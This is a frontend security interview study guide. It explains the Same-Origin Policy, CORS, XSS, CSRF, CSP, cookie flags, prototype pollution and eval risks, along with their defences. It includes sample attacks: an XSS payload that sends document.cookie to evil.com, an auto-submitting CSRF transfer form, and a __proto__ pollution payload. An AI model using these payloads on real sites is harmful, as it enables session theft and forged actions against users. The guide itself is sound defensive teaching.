# 25 — Frontend Security Basics

> **Interview + Understanding Guide** — `00-starter-roadmap.md` Section 25
>
> Goal: Explain XSS, CSRF, CORS and the Same-Origin Policy clearly, know the defences (CSP, cookie flags, escaping, sanitization), and recognise JS-specific risks like prototype pollution and `eval`.

---

# 1. Same-Origin Policy (SOP) ⭐

The browser's core security rule: **a page can only read data from the same origin** it came from.

**Origin = protocol + host + port**

| URL A | URL B | Same origin? |
| --- | --- | --- |
| `https://app.com/a` | `https://app.com/b` | ✅ (path doesn't matter) |
| `https://app.com` | `http://app.com` | ❌ protocol |
| `https://app.com` | `https://api.app.com` | ❌ host (subdomain) |
| `https://app.com` | `https://app.com:8080` | ❌ port |

### What SOP restricts

- JS **reading** responses from other origins (`fetch`, XHR)
- Accessing another origin's DOM (iframes), cookies, `localStorage`

### What SOP allows

- **Embedding** cross-origin resources: `<img>`, `<script>`, `<link rel=stylesheet>`, `<video>`, `<iframe>` (display, not read)
- **Sending** requests (forms, links, `fetch`) — the request goes out; SOP just blocks reading the response. ⚠️ This is why **CSRF** is possible.

> Without SOP, any site you visit could `fetch("https://yourbank.com/account")` with your cookies and read your balance.

---

# 2. CORS — Cross-Origin Resource Sharing ⭐

**CORS** is how a **server opts in** to letting other origins read its responses. It **relaxes** SOP; it's enforced by the **browser**.

```text
Frontend: https://app.com  ──fetch──▶  API: https://api.example.com
Browser adds:     Origin: https://app.com
Server responds:  Access-Control-Allow-Origin: https://app.com   → browser lets JS read it ✅
(no header / wrong origin)                                         → browser blocks reading ❌ "CORS error"
```

### Simple vs preflighted requests

**Simple requests** (GET/HEAD/POST with simple headers and content types like `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) are sent directly.

Anything else — `PUT`, `DELETE`, `PATCH`, `Content-Type: application/json`, custom headers like `Authorization` — triggers a **preflight** `OPTIONS` request first:

```http
OPTIONS /users HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 600
```

Only if the preflight succeeds does the browser send the real request.

### Credentials (cookies)

```js
fetch("https://api.example.com/me", { credentials: "include" });
```

Server must respond with:

```http
Access-Control-Allow-Origin: https://app.com   ← must be an exact origin, NOT *
Access-Control-Allow-Credentials: true
```

### CORS facts interviewers check

- CORS is enforced by **browsers only** — Postman/curl/servers ignore it. **It's not a server-side security mechanism** against attackers; it protects users' browsers.
- A "CORS error" is fixed on the **server** (or via a dev proxy), not by frontend code.
- `mode: "no-cors"` doesn't bypass CORS — it gives you an **opaque** response you can't read.
- `Access-Control-Allow-Origin: *` can't be combined with credentials.

### Dev proxy (common fix during development)

```js
// vite.config.js
export default {
  server: { proxy: { "/api": "http://localhost:8080" } }, // same-origin from the browser's view
};
```

---

# 3. XSS — Cross-Site Scripting ⭐⭐⭐

**XSS** = an attacker gets **their JavaScript to run in your page**, in your users' browsers, with your origin's privileges.

What attacker JS can do: read non-`HttpOnly` cookies & `localStorage` tokens, make authenticated requests as the user, change the page (fake login forms), log keystrokes.

### Types

| Type | How |
| --- | --- |
| **Stored** | Malicious script saved in the DB (comment, profile name) and served to every viewer |
| **Reflected** | Script in the URL/request reflected back in the response (`?q=<script>...`) |
| **DOM-based** | Client-side JS writes untrusted data into a dangerous sink (`innerHTML`, `eval`, `location`) |

### Example (DOM-based)

```js
// URL: https://site.com/search?q=<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
const q = new URLSearchParams(location.search).get("q");
results.innerHTML = `You searched for: ${q}`; // ❌ executes the onerror script
```

> `<script>` tags inserted via `innerHTML` don't execute — but event-handler attributes (`onerror`, `onload`) do.

### Defences ⭐

1. **Escape/encode output by default** — treat all user data as text.

   ```js
   results.textContent = `You searched for: ${q}`; // ✅
   ```

2. **Avoid dangerous sinks** with untrusted data:
   `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout("string")`, `element.setAttribute("on...")`, `href="javascript:..."`.

3. **Sanitize** when you must render user HTML (rich text, markdown):

   ```js
   import DOMPurify from "dompurify";
   el.innerHTML = DOMPurify.sanitize(userHtml);
   ```

4. **Validate URLs** before putting them in `href`/`src`:

   ```js
   const safeHref = (url) => {
     try {
       const u = new URL(url, location.origin);
       return ["http:", "https:", "mailto:"].includes(u.protocol) ? u.href : "#";
     } catch {
       return "#";
     }
   };
   ```

5. **Content Security Policy** (below) as defence-in-depth.
6. **`HttpOnly` cookies** so XSS can't steal session tokens.

### XSS in React

React **escapes** everything rendered with `{}` by default:

```jsx
<div>{userInput}</div> // ✅ rendered as text, even if it contains <script>
```

Remaining risks in React:

```jsx
<div dangerouslySetInnerHTML={{ __html: userHtml }} />   // ❌ unless sanitized
<a href={userUrl}>link</a>                                 // ❌ "javascript:alert(1)" (React warns, but validate)
ref.current.innerHTML = userInput;                         // ❌ bypasses React
eval(userInput);                                            // ❌
```

Also: SSR state injection (`<script>window.__STATE__ = ${JSON.stringify(state)}</script>`) must escape `</script>` and `<`.

---

# 4. CSRF — Cross-Site Request Forgery ⭐⭐⭐

**CSRF** tricks a logged-in user's browser into **sending an unwanted request** to a site where they're authenticated. It works because browsers **automatically attach cookies** to requests to that site.

```html
<!-- On evil.com — the user is logged into bank.com in another tab -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById("f").submit();</script>
```

The browser sends the user's `bank.com` session cookie → the bank thinks it's a legit request. The attacker can't **read** the response (SOP), but the **action** happens.

### XSS vs CSRF

| XSS | CSRF |
| --- | --- |
| Attacker runs **code in your site** | Attacker makes the **user's browser send a request** to your site |
| Can read data and do anything the user can | Can only trigger actions; can't read responses |
| Exploits trust the **user** has in the site | Exploits trust the **site** has in the user's browser (cookies) |
| Fix: escaping, sanitization, CSP | Fix: SameSite cookies, CSRF tokens |

### Defences ⭐

1. **`SameSite` cookies** — `Lax` (default in modern browsers) blocks cookies on cross-site POSTs/fetches; `Strict` blocks all cross-site sends.
2. **CSRF tokens** — server issues a random token (in a page/meta tag or non-HttpOnly cookie); the frontend sends it in a header/body; the server verifies it. evil.com can't read it (SOP).

   ```js
   const token = document.querySelector('meta[name="csrf-token"]').content;
   fetch("/api/transfer", {
     method: "POST",
     headers: { "Content-Type": "application/json", "X-CSRF-Token": token },
     credentials: "include",
     body: JSON.stringify(data),
   });
   ```

3. **Don't change state with GET** requests.
4. Check **`Origin`/`Referer`** headers on the server.
5. Custom headers + JSON content type force a CORS preflight, which cross-site attackers can't pass.
6. Re-authentication for critical actions (password change, payments).

> Tokens in `localStorage` sent via `Authorization` headers aren't vulnerable to CSRF (not sent automatically) — but they are exposed to XSS. Trade-offs: see `13-browser-storage.md` §6.

---

# 5. Content Security Policy (CSP)

An HTTP response header telling the browser **which sources of content are allowed**. Even if an attacker injects markup, the browser refuses to run unapproved scripts.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
```

| Directive | Controls |
| --- | --- |
| `default-src` | Fallback for everything |
| `script-src` | Where scripts can load from; blocks inline scripts & `eval` unless allowed |
| `connect-src` | `fetch`/XHR/WebSocket destinations (limits data exfiltration) |
| `img-src`, `style-src`, `font-src` | Resource types |
| `frame-ancestors` | Who can iframe your site (**clickjacking** protection; replaces `X-Frame-Options`) |

- **Nonces/hashes** allow specific inline scripts: `<script nonce="r4nd0m">`.
- Avoid `'unsafe-inline'` and `'unsafe-eval'` for scripts.
- Roll out with `Content-Security-Policy-Report-Only` first to collect violations without breaking the site.

---

# 6. Cookie Security Flags

| Flag | Protects against |
| --- | --- |
| `HttpOnly` | XSS reading the cookie (`document.cookie` can't see it) |
| `Secure` | Sending over plain HTTP (network sniffing) |
| `SameSite=Lax/Strict` | CSRF |
| `Domain` / `Path` scope (keep narrow) | Leaking to unrelated subdomains/paths |
| `__Host-` prefix | Forces `Secure`, `Path=/`, no `Domain` → can't be set by subdomains |

```http
Set-Cookie: __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax
```

---

# 7. Prototype Pollution ⭐

An attacker injects properties into **`Object.prototype`**, so **every object** in the app inherits them.

```js
// Naive deep merge
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] ??= {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const payload = JSON.parse('{"__proto__": {"isAdmin": true}}'); // e.g. from a request body / URL
merge({}, payload);

const user = {};
console.log(user.isAdmin); // true ❗ every object is now "admin"
```

`JSON.parse` creates an **own** property literally named `"__proto__"`; then `target["__proto__"]` in the merge accesses the **real prototype** (`Object.prototype`) and writes into it.

### Defences

```js
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {      // own keys only
    if (FORBIDDEN.has(key)) continue;            // block dangerous keys
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      if (!Object.hasOwn(target, key)) target[key] = {};
      safeMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

- Use `Object.create(null)` for dictionaries (no prototype) or `Map`.
- Validate input with schemas (zod, ajv).
- `Object.freeze(Object.prototype)` in hardened environments.
- Keep libraries updated (lodash `merge`/`set`, jQuery `extend` had CVEs).

---

# 8. Safe JSON Handling

- **`JSON.parse`** is safe from code execution (unlike `eval`) — but wrap in `try/catch` and **validate the shape**; never trust that parsed data has the fields/types you expect.
- Watch for `__proto__` keys when merging parsed objects (prototype pollution).
- **Never** parse JSON with `eval("(" + text + ")")`.
- Embedding JSON in HTML (`<script>` tags) → escape `<` as `<` so `</script>` can't break out.

```js
function parseJSON(text, fallback = null) {
  try {
    return JSON.parse(text);
  } catch {
    return fallback;
  }
}

// Validate
const data = parseJSON(raw);
if (!data || typeof data.id !== "number") throw new Error("Invalid payload");
```

---

# 9. `eval()` Risks

```js
eval(userInput);                 // runs arbitrary code with your page's privileges
new Function("return " + input); // same risk
setTimeout("doSomething()", 100); // string form = eval
```

Problems:
- **Code injection** / XSS
- Blocked by strict CSP (`'unsafe-eval'` needed)
- **Slower** — prevents engine optimizations
- Hard to debug

Alternatives: `JSON.parse` for data, lookup tables (`handlers[action]()`), proper parsers for expressions.

---

# 10. Other Things to Mention

| Topic | One-liner |
| --- | --- |
| **Clickjacking** | Your site loaded in an invisible iframe to trick clicks → `frame-ancestors 'none'` / `X-Frame-Options: DENY` |
| **`target="_blank"`** | Old browsers gave the new tab `window.opener` access (reverse tabnabbing) → `rel="noopener noreferrer"` (modern browsers imply `noopener`) |
| **HTTPS / HSTS** | Encrypt traffic; `Strict-Transport-Security` forces HTTPS |
| **Subresource Integrity (SRI)** | `<script src="cdn..." integrity="sha384-...">` — refuse tampered CDN files |
| **Dependencies** | `npm audit`, Dependabot; supply-chain attacks are real |
| **Secrets** | Never put API secrets in frontend code/env vars bundled into JS — everything shipped is public |
| **Open redirects** | Validate `?redirect=` targets against an allowlist |

---

# 11. Interview Answers

**What is XSS and how do you prevent it?**

> "XSS is when an attacker manages to run their own JavaScript in our page, usually by injecting it through user input that we render as HTML. It can steal tokens or act as the user. I prevent it by escaping output by default — React does this — avoiding `innerHTML` and `dangerouslySetInnerHTML` with untrusted data or sanitizing with DOMPurify when needed, validating URLs, using a Content Security Policy, and keeping session cookies `HttpOnly`."

**What is CSRF and how do you prevent it?**

> "CSRF tricks a logged-in user's browser into sending a request to our site from another site, relying on cookies being attached automatically. Defences are `SameSite` cookies, CSRF tokens the attacker can't read, never changing state on GET, and checking the `Origin` header."

**What is CORS?**

> "The Same-Origin Policy stops JavaScript reading responses from other origins. CORS is how a server explicitly allows specific origins to read its responses, using headers like `Access-Control-Allow-Origin`. Non-simple requests get an `OPTIONS` preflight first. It's enforced by the browser, so CORS errors are fixed on the server, and it isn't protection against non-browser clients."

---

# 12. Key Takeaways

- Origin = protocol + host + port; SOP blocks reading cross-origin responses, not sending requests.
- CORS = server opt-in via headers; preflight for non-simple requests; browser-enforced.
- XSS = injected script runs in your page → escape, sanitize, avoid dangerous sinks, CSP, HttpOnly.
- CSRF = forged requests with auto-sent cookies → SameSite, CSRF tokens, no state-changing GETs.
- CSP restricts script sources and inline code.
- Prototype pollution via `__proto__` keys in merges → block keys, use `Object.create(null)`/`Map`, validate.
- Never `eval` untrusted input; validate parsed JSON.

## Readiness Checklist

- [ ] Determine same/cross origin for any URL pair
- [ ] Explain a CORS preflight end to end
- [ ] Explain XSS types and 5 defences (incl. React specifics)
- [ ] Explain CSRF and why SameSite/tokens work
- [ ] Demonstrate and fix prototype pollution
- [ ] Explain each cookie flag
